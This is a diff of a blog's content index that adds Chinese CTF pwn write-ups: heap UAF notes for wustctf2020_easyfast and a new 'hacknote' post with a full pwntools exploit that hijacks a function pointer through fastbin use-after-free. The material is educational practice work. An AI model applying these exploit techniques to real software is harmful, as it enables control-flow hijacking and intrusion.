@@ -3895,7 +3895,7 @@ p.recv()[2:]        #从第二个索引开始截取
   </entry>
   <entry>
     <title>wustctf2020_easyfast</title>
-    <url>/2022/03/15/week3-1/</url>
+    <url>/2022/03/15/week3-1.1/</url>
     <content><![CDATA[<html><head></head><body><p>2022-3-15</p>
 <h4 id="wustctf2020-easyfast">wustctf2020_easyfast<a class="post-anchor" href="#wustctf2020-easyfast"></a></h4><p>checksec :</p>
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.39.36.png" data-caption="截屏2022-03-15 下午3.39.36" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.39.36.png" alt="截屏2022-03-15 下午3.39.36"></a></p>
@@ -3904,6 +3904,8 @@ p.recv()[2:]        #从第二个索引开始截取
 <p>​        首先逆向以后大体的思路是利用这个UAF进行<code>0x602090</code>的地址处的覆盖。</p>
 <p>​        所以我们需要构造chunk pointer为0x602080的fake chunk，使得对应的用户空间可以被写为0。这里就可以用到edit的任意写功能，将某个chunk的fd覆盖为0x602080，使得下一次申请到该地址的chunk。</p>
 <p>​        首先add再free两个chunk。</p>
+<p>稍微有一个要注意的就是<a href="file:///Users/rin/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%889.38.49.png?lastModify=1647351509" data-caption="截屏2022-03-15 下午9.38.49" data-fancybox="images"><img src="file:///Users/rin/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%889.38.49.png?lastModify=1647351509" alt="截屏2022-03-15 下午9.38.49"></a></p>
+<p>这个地址是我们fake chunk的size位，也就是说明这个chunk申请时应该为0x40。也就是所有chunk都应该是0x40大小。</p>
 <pre><code class="python">add(0x40)
 add(0x40)
 free(0)
@@ -3959,7 +3961,90 @@ edit(3,p64(0))
 p.sendafter("choice&gt;\n","4")
 p.interactive()
 </code></pre>
-<h4 id="总结">总结<a class="post-anchor" href="#总结"></a></h4><p>​        其实没有什么好总结的，这算是最水的一类堆题了，纯粹是太久没有做复健一下，一晚上能做三四道*（（（</p>
+<h4 id="总结">总结<a class="post-anchor" href="#总结"></a></h4><p>​        其实没有什么好总结的，这算是最水的一类堆题了，纯粹是太久没有做复健一下，一晚上能做三四道。</p>
+</body></html>]]></content>
+      <tags>
+        <tag>week</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>lab 10 hacknote</title>
+    <url>/2022/03/15/week3-1.2/</url>
+    <content><![CDATA[<html><head></head><body><p>​        这个题已经做过好多遍了orz，因为不断的摆烂然后复健…..每次又是做这道</p>
+<p>​        逆一下。</p>
+<p>​        话说可以总结一下类似的题目的快速逆向方法。比如说一般肯定会定义一个结构体，结构体中包含比如content和指针的字段，然后如果有可以利用的uaf或者double free的话，就可以覆盖结构体中保存的指针字段，从而进一步攻击。</p>
+<p>​        回到这道题，这里的结构体包含两个字段，一个是<code> print_note_content</code>这个函数的地址，另外一个是结构体的content。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8A%E5%8D%8810.51.14.png" data-caption="截屏2022-03-16 上午10.51.14" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8A%E5%8D%8810.51.14.png" alt="截屏2022-03-16 上午10.51.14"></a></p>
+<p>随便申请一个note，chunk布局长这样（因为是32位的程序，所以显示上有些bug，但不影响）</p>
+<p>​        0x804865b就是<code>print_note_content</code>函数的地址，然后前面一个估计是堆上的地址。</p>
+<pre><code class="c">  if ( *(&amp;notelist + v1) )
+    (*(void (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));
+</code></pre>
+<p>​            接着如果put note，这个print函数就会调用这个<code>print note</code>字段。所以利用思路就是利用UAf然后修改chunk中<code>print note</code>字段的地址为<code>magic()</code>的地址，然后再尝试puts此chunk，就相当于调用了<code>magic()</code>。</p>
+<p>​        但是由于程序并没有直接给出edit的功能，我们需要想办法在合适位置构建fake chunk，使得chunk的print字段正好处于我们可以任意写入内容的fake chunk的content字段。</p>
+<p>​        需要注意的就是free note的过程是分别顺序先释放content chunk再释放put chunk，并且两个chunk的size不同，fastbin链表的种类也不同，分配的顺序也不同。</p>
+<pre><code class="python">from pwn import *
+
+libc = ELF("/glibc/2.23/32/lib/libc-2.23.so")
+context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+
+'''
+if args['REMOTE']:
+    p = remote("node4.buuoj.cn",27999)
+else:
+    '''
+p = process(["/glibc/2.23/32/lib/ld-2.23.so","./hackernote"],env={"LD_PRELOAD" : "/glibc/2.23/32/lib/libc.so.6"})
+
+magic = 0x08048986
+
+def cmd(idx):
+    p.recvuntil("Your choice :")
+    p.sendline(str(idx))
+
+
+def add(size,content):
+    cmd(1)
+    p.recvuntil('Note size :')
+    p.sendline(str(size))
+    p.recvuntil("Content :")
+    p.sendline(content)
+
+
+def free(idx):
+    cmd(2)
+    p.recvuntil('Index :')
+    p.sendline(str(idx))
+
+
+def put(idx):
+    cmd(3)
+    p.recvuntil('Index :')
+    p.sendline(str(idx))
+
+add(0x20,b"aabb")#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]
+add(0x20,b"aabb")#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]
+free(0)
+'''
+main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)
+'''
+free(1)
+'''
+fastbin:
+main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) 
+main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)
+'''
+gdb.attach(p)
+add(8,p32(magic))#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print 
+put(0)
+
+p.interactive()
+</code></pre>
+<p>​        </p>
+<p>​        </p>
+<p>​        这个高亮怎么这么怪。</p>
+<p>​        </p>
+<p>​        </p>
 </body></html>]]></content>
       <tags>
         <tag>week</tag>
